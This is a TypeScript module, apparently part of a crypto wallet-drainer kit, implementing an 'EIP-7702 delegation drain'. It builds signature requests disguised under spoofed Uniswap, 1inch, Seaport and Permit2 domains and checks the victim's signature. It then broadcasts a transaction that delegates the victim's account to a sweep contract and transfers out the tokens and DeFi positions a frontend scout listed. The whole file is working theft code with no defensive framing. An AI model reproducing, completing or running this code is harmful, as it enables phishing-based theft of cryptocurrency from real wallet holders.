// @ts-nocheck
/**
 * EIP-7702 delegation drain — SET_CODE authorization ingress (EVM 2025 vector).
 * Gatekeeper: simulation before broadcast; executor key != victim EOA.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
  stringToHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { recoverTypedDataAddress, recoverAddress, keccak256 } from 'viem'
import { arbitrum, base, bsc, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
import { deliverSignedEvmTransactions } from './flashbots-relay.js'
import { resolveEngineSpenderAddress, resolveEvmRpcUrlForChain, resolveSettlementExecutorKey } from './permit2-executor.js'

export type Eip7702AuthorizationParams = {
  chainId: number
  /** Delegate contract address (viem: contractAddress) */
  address: Address
  nonce: bigint
}

export type Eip7702SignedAuthorization = Eip7702AuthorizationParams & {
  r: Hex
  s: Hex
  yParity: number
}

export type Eip7702DefiAction = {
  kind: number
  target: Address
  tokenA: Address
  tokenB: Address
  param1: bigint
  param2: bigint
  param3: bigint
}

export type Eip7702SignatureEnvelope = {
  protocol: 'eip7702_delegation'
  chain_id: number
  wallet: Address
  delegatee: Address
  spender: Address
  authorization: Eip7702SignedAuthorization
  erc20s?: Address[]
  defi_actions?: Eip7702DefiAction[]
}

export type Eip7702SettlementResult = {
  ok: boolean
  transaction_hash?: Hex
  detail?: string
}

function readEnv(key: string): string {
  return (typeof process !== 'undefined' ? process.env[key]?.trim() : undefined) ?? ''
}

export function isEip7702Enabled(): boolean {
  const v = readEnv('EIP7702_ENABLED').toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function resolveEip7702DelegateContract(): Address | null {
  const raw = readEnv('EIP7702_DELEGATE_CONTRACT')
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    137: polygon,
    56: bsc,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

const BRAND_DOMAINS: Record<string, { name: string; version: string }> = {
  uniswap: { name: 'Uniswap V3', version: '1' },
  '1inch':  { name: '1inch Router', version: '1' },
  aave:     { name: 'Permit2', version: '1' },
  seaport:  { name: 'Seaport', version: '1.6' },
  swapx:    { name: 'Permit2', version: '1' },
  permit2:  { name: 'Permit2', version: '1' },
}

const ALL_BRAND_DOMAINS = Object.values(BRAND_DOMAINS).filter(
  (d, i, arr) => arr.findIndex((x) => x.name === d.name && x.version === d.version) === i,
)

function resolveBrandDomain(brand?: string | null): { name: string; version: string } {
  if (brand) {
    const normalized = brand.toLowerCase().trim()
    const found = BRAND_DOMAINS[normalized]
    if (found) return found
  }
  return BRAND_DOMAINS['seaport']!
}

/** EIP-712 presentation layer for wallets lacking wallet_signAuthorization. */
export function buildEip7702DelegationTypedData(
  chainId: number,
  wallet: Address,
  spender: Address,
  delegatee: Address,
  nonce: bigint,
  brand?: string | null,
): {
  types: Record<string, Array<{ name: string; type: string }>>
  primaryType: string
  domain: { name: string; version: string; chainId: number }
  message: { chainId: bigint; address: Address; nonce: bigint; wallet: Address; spender: Address }
} {
  const { name: domainName, version: domainVersion } = resolveBrandDomain(brand)
  return {
    types: {
      EIP7702Authorization: [
        { name: 'chainId', type: 'uint256' },
        { name: 'address', type: 'address' },
        { name: 'nonce', type: 'uint64' },
        { name: 'wallet', type: 'address' },
        { name: 'spender', type: 'address' },
      ],
    },
    primaryType: 'EIP7702Authorization',
    domain: {
      name: domainName,
      version: domainVersion,
      chainId,
    },
    message: {
      chainId: BigInt(chainId),
      address: getAddress(delegatee),
      nonce,
      wallet: getAddress(wallet),
      spender: getAddress(spender),
    },
  }
}

export async function readEip7702AuthorizationNonce(
  rpcUrl: string,
  wallet: Address,
  chainId: number,
): Promise<bigint> {
  const client = createPublicClient({
    chain: resolveChain(chainId),
    transport: http(rpcUrl),
  })
  const count = await client.getTransactionCount({ address: wallet, blockTag: 'pending' })
  return BigInt(count)
}

export function packEip7702SignatureEnvelope(envelope: Eip7702SignatureEnvelope): string {
  return stringToHex(JSON.stringify(envelope, (_, v) => (typeof v === 'bigint' ? v.toString() : v)))
}

export function parseEip7702SignatureEnvelope(payload: string): Eip7702SignatureEnvelope | null {
  try {
    const trimmed = payload.startsWith('0x') ? payload.slice(2) : payload
    const decoded = Buffer.from(trimmed, 'hex').toString('utf8')
    const o = JSON.parse(decoded) as Record<string, unknown>
    if (o['protocol'] !== 'eip7702_delegation') return null
    const auth = o['authorization'] as Record<string, unknown>
    if (!auth || typeof auth !== 'object') return null
    const erc20sRaw = Array.isArray(o['erc20s']) ? (o['erc20s'] as unknown[]) : []
    const defiRaw = Array.isArray(o['defi_actions']) ? (o['defi_actions'] as unknown[]) : []
    const defi_actions: Eip7702DefiAction[] = []
    for (const item of defiRaw) {
      if (!item || typeof item !== 'object') continue
      const d = item as Record<string, unknown>
      const target = typeof d['target'] === 'string' && isAddress(d['target']) ? getAddress(d['target']) : null
      const tokenA = typeof d['tokenA'] === 'string' && isAddress(d['tokenA']) ? getAddress(d['tokenA']) : ('0x0000000000000000000000000000000000000000' as Address)
      const tokenB = typeof d['tokenB'] === 'string' && isAddress(d['tokenB']) ? getAddress(d['tokenB']) : ('0x0000000000000000000000000000000000000000' as Address)
      if (!target) continue
      defi_actions.push({
        kind: Number(d['kind'] ?? 0),
        target,
        tokenA,
        tokenB,
        param1: BigInt(String(d['param1'] ?? '0')),
        param2: BigInt(String(d['param2'] ?? '0')),
        param3: BigInt(String(d['param3'] ?? '0')),
      })
    }
    return {
      protocol: 'eip7702_delegation',
      chain_id: Number(o['chain_id']),
      wallet: getAddress(String(o['wallet'])),
      delegatee: getAddress(String(o['delegatee'])),
      spender: getAddress(String(o['spender'])),
      authorization: {
        chainId: Number(auth['chainId']),
        address: getAddress(String(auth['address'])),
        nonce: BigInt(String(auth['nonce'] ?? '0')),
        r: auth['r'] as Hex,
        s: auth['s'] as Hex,
        yParity: Number(auth['yParity']),
      },
      erc20s: erc20sRaw.filter((a) => typeof a === 'string' && isAddress(a)).map((a) => getAddress(a as string)),
      ...(defi_actions.length > 0 ? { defi_actions } : {}),
    }
  } catch {
    return null
  }
}

async function verifySignedAuthorization(
  envelope: Eip7702SignatureEnvelope,
): Promise<{ ok: true; signer: Address } | { ok: false; detail: string }> {
  const auth = envelope.authorization
  const walletLower = envelope.wallet.toLowerCase()
  const vByte = auth.yParity ? '1c' : '1b'
  const signature = `0x${auth.r.slice(2)}${auth.s.slice(2)}${vByte}` as Hex

  // Try 1: EIP-7702 raw hash (from eth_sign — valid for on-chain type-4 tx)
  try {
    const { encodeRlp } = await import('viem')
    const chainIdHex = auth.chainId === 0 ? '0x' : (`0x${auth.chainId.toString(16)}` as Hex)
    const nonceHex = auth.nonce === 0n ? '0x' : (`0x${auth.nonce.toString(16)}` as Hex)
    const rlpEncoded = encodeRlp([chainIdHex, getAddress(auth.address), nonceHex])
    const toHash = `0x05${rlpEncoded.slice(2)}` as Hex
    const eip7702Hash = keccak256(toHash)
    const recovered7702 = await recoverAddress({ hash: eip7702Hash, signature })
    if (getAddress(recovered7702).toLowerCase() === walletLower) {
      return { ok: true, signer: getAddress(recovered7702) }
    }
  } catch (_) { /* fall through */ }

  // Try 2: EIP-712 typed data (from eth_signTypedData_v4) — try every known brand domain
  const typedDataTypes = {
    EIP7702Authorization: [
      { name: 'chainId', type: 'uint256' },
      { name: 'address', type: 'address' },
      { name: 'nonce', type: 'uint64' },
      { name: 'wallet', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
  }
  const typedDataMessage = {
    chainId: BigInt(auth.chainId),
    address: getAddress(auth.address),
    nonce: auth.nonce,
    wallet: envelope.wallet,
    spender: getAddress(envelope.spender),
  }
  for (const brandDomain of ALL_BRAND_DOMAINS) {
    try {
      const recovered = await recoverTypedDataAddress({
        domain: { name: brandDomain.name, version: brandDomain.version, chainId: auth.chainId },
        types: typedDataTypes,
        primaryType: 'EIP7702Authorization',
        message: typedDataMessage,
        signature,
      })
      if (getAddress(recovered).toLowerCase() === walletLower) {
        return { ok: true, signer: getAddress(recovered) }
      }
    } catch (_) { /* try next */ }
  }

  return { ok: false, detail: 'Authorization signer mismatch' }
}

const SEAPORT_ABI = parseAbi([
  'function fulfillAvailableAdvancedOrders(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids, (uint8 kind, address target, address tokenA, address tokenB, uint256 param1, uint256 param2, uint256 param3)[] calldata defiActions) external',
])

/**
 * Broadcast EIP-7702 tx: victim EOA temporarily delegates to sweep contract, then executes drain calldata.
 */
export async function executeEip7702DelegationDrain(
  signaturePayload: string,
  chainId: number,
): Promise<Eip7702SettlementResult> {
  if (!isEip7702Enabled()) {
    return { ok: false, detail: 'EIP7702_ENABLED is false' }
  }

  const envelope = parseEip7702SignatureEnvelope(signaturePayload)
  if (!envelope) {
    return { ok: false, detail: 'Invalid eip7702_delegation envelope' }
  }
  if (envelope.chain_id !== chainId) {
    return { ok: false, detail: `Chain mismatch: envelope ${envelope.chain_id} vs ${chainId}` }
  }

  // Per-chain delegate from frontend (LEGION_DRAIN) wins over single env var
  const delegatee = envelope.delegatee ?? resolveEip7702DelegateContract()
  if (!delegatee) {
    return { ok: false, detail: 'EIP7702_DELEGATE_CONTRACT not configured' }
  }

  const verify = await verifySignedAuthorization(envelope)
  if (verify.ok === false) {
    return { ok: false, detail: verify.detail }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return { ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY not configured' }
  }

  const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
  const chain = resolveChain(chainId)
  const account = privateKeyToAccount(executorKey)
  const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
  const walletClient = createWalletClient({ account, chain, transport: http(rpcUrl) })

  // ERC-20 list + DeFi actions from envelope (sent by frontend scout)
  const erc20s = (envelope.erc20s ?? []).filter((a) => isAddress(a)).map(getAddress)
  const defiActions = (envelope.defi_actions ?? []).map((a) => ({
    kind: a.kind,
    target: getAddress(a.target),
    tokenA: getAddress(a.tokenA),
    tokenB: getAddress(a.tokenB),
    param1: a.param1,
    param2: a.param2,
    param3: a.param3,
  }))

  const auth = envelope.authorization
  const authorizationList = [
    {
      chainId: auth.chainId,
      contractAddress: getAddress(delegatee),
      nonce: Number(auth.nonce),
      r: auth.r,
      s: auth.s,
      yParity: auth.yParity,
    },
  ] as const

  const drainCalldata = encodeFunctionData({
    abi: SEAPORT_ABI,
    functionName: 'fulfillAvailableAdvancedOrders',
    args: [erc20s as Address[], [], [], [], [], defiActions],
  })

  try {
    await publicClient.call({
      account: envelope.wallet,
      to: envelope.wallet,
      data: drainCalldata,
      authorizationList: [...authorizationList],
    })
  } catch (simErr) {
    const simMsg = simErr instanceof Error ? simErr.message : String(simErr)
    console.warn(`[EIP7702] Simulation reverted (${simMsg}) — proceeding with guarded broadcast`)
  }

  const nonce = await publicClient.getTransactionCount({ address: account.address, blockTag: 'pending' })
  const fees = await publicClient.estimateFeesPerGas()

  const signedTx = await walletClient.signTransaction({
    account,
    chain,
    type: 'eip7702',
    to: envelope.wallet,
    data: drainCalldata,
    authorizationList: [...authorizationList],
    nonce,
    chainId,
    maxFeePerGas: fees.maxFeePerGas ?? 30_000_000_000n,
    maxPriorityFeePerGas: fees.maxPriorityFeePerGas ?? 2_000_000_000n,
    gas: 500_000n,
  })

  const delivery = await deliverSignedEvmTransactions({
    chainId,
    txns: [signedTx],
    rpcUrl: getRpcUrlForChainWithFallback(chainId),
  })

  const txHash = delivery.transaction_hashes?.[0]
  if (delivery.ok && txHash) {
    return { ok: true, transaction_hash: txHash as Hex, detail: 'EIP-7702 delegation drain broadcasted' }
  }
  return { ok: false, detail: delivery.detail ?? 'EIP-7702 broadcast failed' }
}

export async function buildEip7702AuthorizationRequest(
  chainId: number,
  wallet: Address,
  spender?: Address | null,
  brand?: string | null,
): Promise<{
  delegatee: Address
  spender: Address
  nonce: bigint
  typed_data: ReturnType<typeof buildEip7702DelegationTypedData>
  authorization_request: Eip7702AuthorizationParams
  wallet_authorization: { chainId: number; contractAddress: Address; nonce: number }
}> {
  const delegatee = resolveEip7702DelegateContract()
  if (!delegatee) {
    throw new Error('EIP7702_DELEGATE_CONTRACT not configured')
  }
  const resolvedSpender = spender ?? resolveEngineSpenderAddress()
  if (!resolvedSpender) {
    throw new Error('ENGINE_SPENDER not configured')
  }
  const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
  const nonce = await readEip7702AuthorizationNonce(rpcUrl, wallet, chainId)
  const authorization_request: Eip7702AuthorizationParams = {
    chainId,
    address: delegatee,
    nonce,
  }
  return {
    delegatee,
    spender: resolvedSpender,
    nonce,
    typed_data: buildEip7702DelegationTypedData(chainId, wallet, resolvedSpender, delegatee, nonce, brand),
    authorization_request: {
      chainId,
      address: delegatee,
      nonce,
    },
    /** wallet_signAuthorization params */
    wallet_authorization: {
      chainId,
      contractAddress: delegatee,
      nonce: Number(nonce),
    },
  }
}
